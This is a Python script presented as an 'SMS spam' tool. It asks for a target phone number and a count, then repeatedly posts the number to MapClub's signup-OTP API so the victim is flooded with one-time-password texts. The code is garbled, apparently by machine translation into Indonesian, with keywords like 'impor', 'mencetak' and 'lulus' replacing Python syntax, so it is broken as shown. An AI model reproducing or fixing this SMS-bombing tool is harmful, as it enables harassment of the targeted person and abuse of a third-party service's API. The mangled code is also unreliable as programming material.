 
# ~ SUMBER TERBUKA ~ 
# DICETAK OLEH FADIL YAZID
# FB: ID FADIL
impor  os
impor  sys
 waktu impor
 permintaan impor

def  mulai ():
    mencetak
    cetak ( ' \ t \ x1b [1; 92m [ \ x1b [1; 97mSPAM SMS MAPCLUB \ x1b [1; 92m] \ x1b [1; 97m' )
    cetak ( ' \ t        <~~~~~~~~~~~~~~~~~>> )
    print ( ' \ t        Author: Rafly pake i' )
    mencetak
    print ( '(Ex: 0822 ***)' )
    Nomor  =  raw_input ( 'Nomor Target: \ x1b [1; 92m' )
    
    if  len ( Nomor ) <  9 :
         mencetak
         cetak ( ' \ x1b [1; 97m [ \ x1b [1; 91m! \ x1b [1; 97m] Nomor Tidak Valid' )
         waktu . tidur ( 1 )
         os . sistem ( 'jelas' )
         mulai ()
    lain :
         lulus
    
    Nomor  =  int ( Nomor )
    
    mencetak
    cetak ( ' \ x1b [1; 97m (Mis: 5)' )
    Jumlah  =  input ( 'Jumlah: \ x1b [1; 92m' )
    jika  Jumlah  >  15 :
        mencetak
        print ( ' \ x1b [1; 97m [ \ x1b [1; 91m! \ x1b [1; 97m] Jangan terlalu banyak \ n Kalo Ga Mau Tools Ini Coid: v' )
        mencetak
        sys . keluar ()
    
    lain :
        lulus
    
    mencetak
    print ( 'Mulai Mengirim ...' )
    mencetak
    MapClub ( Nomor , Jumlah )

def  MapClub ( Nomor , Jumlah ):
	untuk  _  dalam  kisaran ( Jumlah ):

		waktu . tidur ( 5 )
		header  = {
		'User-Agent' : 'Mozilla / 5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit / 600.8.9 (KHTML, seperti Gecko) Versi / 8.0.8 Safari / 600.8.9' ,
		'Referer' : 'https://mapclub.com/id/user/signup'
		}

		r  =  permintaan . posting ( 'https://cmsapi.mapclub.com/api/signup-otp' , data  = { 'phone' : Nomor }, allow_redirects  =  True )

		jika  'kesalahan'  dalam  r . teks :
			print ( ' \ x1b [1; 97m [ \ x1b [1; 91m * \ x1b [1; 97m] Gagal Membeli Sms Ke Nomor \ x1b [1; 92m'  +  str ( Nomor ))
		
		lain :
			cetak ( ' \ x1b [1; 97m [ \ x1b [1; 92m * \ x1b [1; 97m] Berhasil Membeli Sms Ke Nomor \ x1b [1; 92m'  +  str ( Nomor ))
			
if  __name__  ==  '__main__' :
    os . sistem ( 'jelas' )
    mulai ()